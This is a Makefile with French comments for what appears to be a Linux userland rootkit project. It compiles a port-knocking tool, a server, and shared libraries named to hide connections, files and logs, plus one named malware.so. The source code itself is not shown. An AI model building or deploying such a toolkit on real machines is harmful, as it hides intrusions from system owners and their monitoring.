CC = gcc
CFLAGS = -Wall -Wextra -fPIC -ldl
LDFLAGS = -shared

SRC_DIR = src
BUILD_DIR = build

EXECUTABLES = port_knock server
LIBRARIES = hide_connections.so hide_files.so hide_logs.so malware.so

SRCS = $(wildcard $(SRC_DIR)/*.c)
OBJS = $(SRCS:.c=.o)

all: $(EXECUTABLES) $(LIBRARIES)

# Compiler les exécutables et les mettre dans le répertoire principal
port_knock: $(SRC_DIR)/port_knock.c
	$(CC) $(CFLAGS) -o $@ $<

server: $(SRC_DIR)/server.c
	$(CC) $(CFLAGS) -o $@ $<

# Compiler les bibliothèques partagées
hide_connections.so: $(SRC_DIR)/hide_connections.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $<

hide_files.so: $(SRC_DIR)/hide_files.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $<

hide_logs.so: $(SRC_DIR)/hide_logs.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $<

malware.so: $(SRC_DIR)/malware.c
	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $<

# Nettoyage des fichiers compilés
clean:
	rm -rf $(EXECUTABLES) $(LIBRARIES)

reset: clean

.PHONY: all clean reset
